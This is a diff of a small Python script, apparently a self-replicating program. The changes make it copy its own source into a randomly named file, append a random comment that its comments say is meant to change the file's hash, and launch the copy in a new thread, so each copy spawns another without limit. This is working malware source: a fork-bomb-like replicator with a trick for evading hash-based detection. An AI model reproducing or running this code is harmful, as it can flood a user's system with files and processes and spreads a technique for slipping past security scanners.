@@ -16,7 +16,7 @@ import sys
 import random
 import string
 
-
+#copy the contents of the files into another file
 def writeIntoFile(file, lines):
     count = len(lines)
     start = 0
@@ -27,27 +27,33 @@ def writeIntoFile(file, lines):
             break
         file.write(line)
 
+#get current dir and file name
 directory = os.getcwd()
 thisfile = os.path.basename(__file__)
 
-def runFuncv():
-    os.system('python3 .\\' + thisfile)
 
 
-# get the current file
 
+# get the current file content
 f = open(thisfile, "r")
 lines = f.readlines()
 f.close()
 
+#create new file with random name
 filename = "{randomness}.py".format(
         randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
+#create new file and copy the content of the parent file
 i = open(directory + "\\" + filename, "w")
 writeIntoFile(i, lines)
+
+#add some randomness to change the hash value
 i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
 i.close()
 
-# Create the new file in current dir and run
+def runFuncv():
+    os.system('python3 .\\' + filename)
+
+# run the new file 
 thread = Thread(target=runFuncv)
 thread.start()
